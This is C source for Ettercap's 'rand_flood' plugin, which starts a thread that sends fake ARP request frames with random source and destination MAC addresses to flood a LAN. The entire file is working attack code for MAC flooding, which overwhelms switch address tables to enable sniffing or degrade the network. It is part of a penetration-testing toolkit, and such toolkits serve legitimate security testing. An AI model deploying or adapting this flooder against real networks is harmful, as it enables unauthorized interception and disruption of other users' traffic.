/*
    rand_flood -- ettercap plugin -- Flood the LAN with random MAC addresses

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_threads.h>
#include <time.h>

/* globals */
struct eth_header
{
   u_int8   dha[ETH_ADDR_LEN];       /* destination eth addr */
   u_int8   sha[ETH_ADDR_LEN];       /* source ether addr */
   u_int16  proto;                   /* packet type ID field */
};

struct arp_header {
   u_int16  ar_hrd;          /* Format of hardware address.  */
   u_int16  ar_pro;          /* Format of protocol address.  */
   u_int8   ar_hln;          /* Length of hardware address.  */
   u_int8   ar_pln;          /* Length of protocol address.  */
   u_int16  ar_op;           /* ARP opcode (command).  */
#define ARPOP_REQUEST   1    /* ARP request.  */
};

struct arp_eth_header {
   u_int8   arp_sha[MEDIA_ADDR_LEN];     /* sender hardware address */
   u_int8   arp_spa[IP_ADDR_LEN];      /* sender protocol address */
   u_int8   arp_tha[MEDIA_ADDR_LEN];     /* target hardware address */
   u_int8   arp_tpa[IP_ADDR_LEN];      /* target protocol address */
};

#define FAKE_PCK_LEN sizeof(struct eth_header)+sizeof(struct arp_header)+sizeof(struct arp_eth_header)
struct packet_object fake_po;
char fake_pck[FAKE_PCK_LEN];


/* protos */
int plugin_load(void *);
static int rand_flood_init(void *);
static int rand_flood_fini(void *);
EC_THREAD_FUNC(flooder);


/* plugin operations */

struct plugin_ops rand_flood_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "rand_flood",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Flood the LAN with random MAC addresses",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &rand_flood_init,
   /* deactivation function */                     
   .fini =              &rand_flood_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &rand_flood_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int rand_flood_init(void *dummy) 
{     
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("rand_flood: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }
      
   INSTANT_USER_MSG("rand_flood: Start flooding the LAN...\n");

   /* create the flooding thread */
   ec_thread_new("flooder", "Random flooder thread", &flooder, NULL);
        
   return PLUGIN_RUNNING;
}


static int rand_flood_fini(void *dummy) 
{
   pthread_t pid;

   pid = ec_thread_getpid("flooder");

   /* the thread is active or not ? */
   if (!pthread_equal(pid, EC_PTHREAD_NULL))
      ec_thread_destroy(pid);

   INSTANT_USER_MSG("rand_flood: plugin stopped...\n");

   return PLUGIN_FINISHED;
}


EC_THREAD_FUNC(flooder)
{
   struct timeval seed;
   struct eth_header *heth;
   struct arp_header *harp;
   u_int32 rnd;
   u_char MACS[ETH_ADDR_LEN], MACD[ETH_ADDR_LEN];

#if !defined(OS_WINDOWS)
   struct timespec tm;
   tm.tv_sec = GBL_CONF->port_steal_send_delay;
   tm.tv_nsec = 0;
#endif

   /* Get a "random" seed */ 
   gettimeofday(&seed, NULL);
   srandom(seed.tv_sec ^ seed.tv_usec);

   /* Create a fake ARP packet */
   heth = (struct eth_header *)fake_pck;
   harp = (struct arp_header *)(heth + 1);

   heth->proto = htons(LL_TYPE_ARP);
   harp->ar_hrd = htons(ARPHRD_ETHER);
   harp->ar_pro = htons(ETHERTYPE_IP);
   harp->ar_hln = 6;
   harp->ar_pln = 4;
   harp->ar_op  = htons(ARPOP_REQUEST);

   packet_create_object(&fake_po, (u_char*)fake_pck, FAKE_PCK_LEN);

   /* init the thread and wait for start up */
   ec_thread_init();
   
   LOOP {
      CANCELLATION_POINT();

      rnd = random();
      memcpy(MACS, &rnd, 4);
      rnd = random();
      memcpy(MACS + 4, &rnd, 2);

      rnd = random();
      memcpy(MACD, &rnd, 4);
      rnd = random();
      memcpy(MACD + 4, &rnd, 2);

      /* Fill the source and destination MAC address
       * with random values 
       */
      memcpy(heth->dha, MACD, ETH_ADDR_LEN);
      memcpy(heth->sha, MACS, ETH_ADDR_LEN);

      /* Send on the wire and wait */
      send_to_L2(&fake_po); 

#if !defined(OS_WINDOWS)
      nanosleep(&tm, NULL);
#else
      usleep(GBL_CONF->port_steal_send_delay*1000);
#endif
   }
   
   return NULL; 
}

/* EOF */

// vim:ts=3:expandtab
 
